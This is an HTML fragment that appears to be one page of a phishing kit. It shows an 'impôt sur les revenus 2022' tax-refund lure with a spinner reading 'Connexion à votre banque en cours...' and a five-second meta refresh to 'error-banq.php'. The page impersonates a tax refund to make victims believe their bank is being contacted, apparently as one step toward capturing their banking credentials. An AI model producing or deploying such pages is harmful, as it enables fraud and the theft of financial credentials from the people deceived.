...
<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">
    ...
    <head>
        ...
        <meta http-equiv="refresh" content="5;URL=error-banq.php">
		...
		<div class="modal-contentb">
			...
			<div class="document" style="height: auto;display: flex;flex-direction: column;">
				<div class="header popinV3-header ">
					...
					<h1 id="popinTitle">Remboursement d'impôt sur les revenus  2022</h1>
				</div>
									...
									<div class="blockInside">
										<div>
											...
											<div class="textFCK" style="text-align: center;">
												 <div>
  <img align="center" src="asset/imgs/Gears-0.3s-137px.gif" alt="loading" >
    <br>
    <p><i><font style="text-align: center; color: #0b6ba8;"> Connexion à votre banque en cours...</font></i>
